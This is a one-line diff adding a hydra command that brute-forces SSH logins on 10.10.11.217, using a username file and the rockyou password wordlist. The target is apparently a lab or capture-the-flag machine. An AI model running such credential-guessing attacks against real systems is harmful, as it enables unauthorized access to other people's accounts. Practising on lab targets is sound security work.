@@ -1,0 +1,1 @@
+hydra -L output.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.217 ssh
